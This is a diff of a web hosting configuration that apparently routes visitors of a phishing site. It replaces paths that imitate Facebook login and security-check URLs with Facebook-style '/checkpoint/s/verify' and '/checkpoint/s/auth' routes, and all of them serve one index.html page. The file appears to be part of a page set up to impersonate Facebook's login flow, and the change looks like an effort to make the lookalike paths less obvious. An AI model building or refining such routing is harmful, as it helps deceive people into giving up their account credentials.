@@ -2,25 +2,17 @@
   "redirects": [
     {
       "source": "/",
-      "destination": "/login.facebook.com/secure",
+      "destination": "/checkpoint/s/verify",
       "permanent": false
     }
   ],
   "rewrites": [
     {
-      "source": "/l.facebook.com/login",
+      "source": "/checkpoint/s/verify",
       "destination": "/index.html"
     },
     {
-      "source": "/l.facebook.com/security/check",
-      "destination": "/index.html"
-    },
-    {
-      "source": "/login.facebook.com/secure",
-      "destination": "/index.html"
-    },
-    {
-      "source": "/facebook.com/login/verify",
+      "source": "/checkpoint/s/auth",
       "destination": "/index.html"
     }
   ]
